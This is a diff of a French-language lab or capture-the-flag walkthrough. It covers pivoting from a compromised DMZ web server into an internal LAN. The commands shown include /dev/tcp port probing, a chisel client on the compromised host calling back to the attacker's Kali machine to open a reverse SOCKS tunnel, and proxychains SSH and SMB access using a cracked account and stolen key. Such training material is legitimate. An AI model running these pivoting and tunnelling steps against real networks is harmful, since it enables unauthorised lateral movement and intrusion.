@@ -99,25 +99,33 @@ cat /root/flag_root.txt
 
 web01 possède une **route vers le LAN** (`172.31.20.0/24 via 172.31.10.2`, posée par
 son entrypoint avec `NET_ADMIN`). Le LAN n'est **pas publié** : on l'atteint **par
-web01**. Trois approches, du plus simple au plus robuste :
+web01**. ⚠️ web01 n'expose **aucun compte SSH** (root verrouillé, `www-data` sans
+shell) : on ne « saute » donc **pas** par un `ssh -J ...@web01`. On pivote par le
+**shell déjà obtenu** sur web01 (www-data → root). Deux approches :
 
 ```bash
-# 1) Reco depuis le shell web (déjà sur place)
+# 1) Reco depuis le shell web (déjà sur place, sans rien téléverser)
 for h in 11 12; do (echo > /dev/tcp/172.31.20.$h/22) 2>/dev/null && echo "172.31.20.$h:22 ouvert"; done
 #   → .11 (files: 445/22), .12 (admin: 22)
+#   web01 a aussi un client ssh + smbclient : on peut déjà agir DIRECTEMENT depuis lui.
 
-# 2) Tunnel SOCKS avec chisel (téléverser le binaire via le shell web, puis) :
+# 2) Tunnel SOCKS avec chisel (méthode reine — outils de la Kali via le pivot) :
 #    Kali:   ./chisel server -p 8000 --reverse
-#    web01:  ./chisel client <IP_KALI>:8000 R:1080:socks
+#    web01:  ./chisel client <IP_KALI>:8000 R:1080:socks      # lancé depuis le shell web
 #    Kali:   proxychains smbclient -N -L //172.31.20.11
 #            proxychains ssh -i id_admin c.vasseur@172.31.20.12
 
-# 3) Rebond SSH par sauts (-J) une fois qu'on a un accès SSH sur web01/files :
-#    ssh -J a.pommier@$WEB_IP a.pommier@172.31.20.11
+# 3) ssh -J devient utile UNE FOIS qu'on a un VRAI compte SSH dans le LAN :
+#    files expose le compte a.pommier (mdp craqué) → on peut rebondir par files
+#    pour atteindre admin (via le tunnel de l'étape 2) :
+#    proxychains ssh -J a.pommier@172.31.20.11 -i id_admin c.vasseur@172.31.20.12
 ```
 
 > Pédagogie : l'important est de **comprendre** qu'on rebondit par la machine
-> compromise. Tous les chemins (chisel/proxychains, `ssh -D`, `ssh -J`) sont acceptés.
+> compromise. Le franchissement DMZ→LAN se fait par le **shell sur web01** (chisel/
+> proxychains, ou en agissant directement depuis web01) — pas par un saut SSH sur
+> web01 qui n'a aucun compte exposé. `ssh -J` ne sert qu'à rebondir **dans** le LAN
+> (via `a.pommier@files`) une fois le tunnel établi.
 
 ---
 
